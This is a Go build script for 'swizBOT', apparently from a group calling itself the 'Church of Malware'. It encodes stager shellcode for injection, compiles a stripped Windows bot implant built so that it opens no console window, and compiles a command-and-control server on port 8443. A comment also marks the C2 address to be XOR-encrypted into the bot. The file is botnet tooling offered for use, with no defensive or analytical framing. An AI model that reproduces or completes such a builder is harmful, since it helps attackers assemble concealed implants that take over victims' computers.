package main

import (
    "fmt"
    "os"
    "os/exec"
    "runtime"
)

func main() {
    fmt.Println(`⛧ swizBOT Builder - Church of Malware ⛧`)
    
    // 1. Build the stager shellcode using Jake's encoder
    fmt.Println("[1/4] Building stager shellcode...")
    cmd := exec.Command("python3", "stager/encoder.py", 
        "stager/downloader.bin", "stager/shellcode.bin")
    cmd.Run()
    
    // 2. Compile Go client for Windows (PIE + stripped)
    fmt.Println("[2/4] Compiling Go bot client...")
    os.Setenv("GOOS", "windows")
    os.Setenv("GOARCH", "amd64")
    os.Setenv("CGO_ENABLED", "0")
    cmd = exec.Command("go", "build", "-ldflags", 
        "-s -w -H=windowsgui", "-o", "output/bot.exe", "./client")
    cmd.Run()
    
    // 3. Compile C2 server (Linux + Windows)
    fmt.Println("[3/4] Compiling C2 server...")
    os.Setenv("GOOS", runtime.GOOS)
    cmd = exec.Command("go", "build", "-o", "output/c2", "./c2")
    cmd.Run()
    
    // 4. Generate encrypted config for bot
    fmt.Println("[4/4] Generating bot config...")
    // XOR encrypt C2 URL and embed in bot binary
    
    fmt.Println(`✅ swizBOT ready in ./output/`)
    fmt.Println(`   - c2: HTTPS server on :8443`)
    fmt.Println(`   - bot.exe: Windows implant`)
    fmt.Println(`   - stager.bin: Raw shellcode for injection`)
}
